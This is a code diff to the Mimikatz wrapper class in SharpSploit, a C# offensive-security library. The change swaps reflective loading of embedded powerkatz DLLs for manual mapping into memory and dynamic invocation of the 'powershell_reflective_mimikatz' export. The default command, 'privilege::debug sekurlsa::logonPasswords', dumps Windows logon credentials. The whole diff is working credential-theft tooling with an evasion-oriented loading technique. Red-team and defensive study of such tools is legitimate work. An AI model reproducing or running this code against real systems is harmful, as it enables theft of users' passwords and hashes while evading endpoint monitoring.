@@ -9,7 +9,7 @@ using System.Net.NetworkInformation;
 using System.Runtime.InteropServices;
 
 using SharpSploit.Misc;
-using SharpSploit.Execution;
+using SharpSploit.Execution.ManualMap;
 using PInvoke = SharpSploit.Execution.PlatformInvoke;
 
 namespace SharpSploit.Credentials
@@ -23,8 +23,7 @@ namespace SharpSploit.Credentials
     /// Mimikatz is a tool for playing with credentials in Windows, written by Benjamin Delpy (@gentilkiwi). (Found
     /// at https://github.com/gentilkiwi/mimikatz).
     /// SharpSploit's PE Loader is adapted from work by Casey Smith (@subtee). (No longer available at original location.)
-    /// This wrapper class is adapted from Chris Ross (@xorrior)'s implementation. (Found
-    /// at https://github.com/xorrior/Random-CSharpTools/tree/master/DllLoader/DllLoader)
+    /// This wrapper class is adapted from Chris Ross (@xorrior)'s implementation, converted by (@TheRealWover) to use the Manual Mapping API.
     /// </remarks>
     public class Mimikatz
     {
@@ -42,34 +41,38 @@ namespace SharpSploit.Credentials
         /// <returns>Mimikatz output.</returns>
         public static string Command(string Command = "privilege::debug sekurlsa::logonPasswords")
         {
+
+            PE.PE_MANUAL_MAP MimikatzPE = new PE.PE_MANUAL_MAP();
             // Console.WriteLine(String.Join(",", System.Reflection.Assembly.GetExecutingAssembly().GetManifestResourceNames()));
-            if (MimikatzPE == null)
+
+            string[] manifestResources = System.Reflection.Assembly.GetExecutingAssembly().GetManifestResourceNames();
+
+            try
             {
-                string[] manifestResources = System.Reflection.Assembly.GetExecutingAssembly().GetManifestResourceNames();
-                if (IntPtr.Size == 4 && MimikatzPE == null)
+                if (IntPtr.Size == 4)
                 {
                     if (PEBytes32 == null)
                     {
                         PEBytes32 = Utilities.GetEmbeddedResourceBytes("powerkatz_x86.dll");
                         if (PEBytes32 == null) { return ""; }
                     }
-                    MimikatzPE = PE.Load(PEBytes32);
+                    MimikatzPE = Map.MapModuleToMemory(PEBytes32);
                 }
-                else if (IntPtr.Size == 8 && MimikatzPE == null)
+                else if (IntPtr.Size == 8)
                 {
                     if (PEBytes64 == null)
                     {
                         PEBytes64 = Utilities.GetEmbeddedResourceBytes("powerkatz_x64.dll");
                         if (PEBytes64 == null) { return ""; }
                     }
-                    MimikatzPE = PE.Load(PEBytes64);
+                    MimikatzPE = Map.MapModuleToMemory(PEBytes64);
                 }
             }
-            if (MimikatzPE == null) { return ""; }
-            IntPtr functionPointer = MimikatzPE.GetFunctionExport("powershell_reflective_mimikatz");
-            if (functionPointer == IntPtr.Zero) { return ""; }
+            catch (Exception ex)
+            {
+                return ex.Message;
+            }
 
-            MimikatzType mimikatz = (MimikatzType) Marshal.GetDelegateForFunctionPointer(functionPointer, typeof(MimikatzType));
             IntPtr input = Marshal.StringToHGlobalUni(Command);
             try
             {
@@ -78,7 +81,12 @@ namespace SharpSploit.Credentials
                 {
                     try
                     {
-                        output = mimikatz(input);
+                        object[] parameters =
+                        {
+                            input
+                        };
+
+                        output = (IntPtr) Execution.DynamicInvoke.Generic.CallMappedDLLModuleExport(MimikatzPE.PEINFO, MimikatzPE.ModuleBase, "powershell_reflective_mimikatz", typeof(MimikatzType), parameters);
                     }
                     catch (Exception e)
                     {
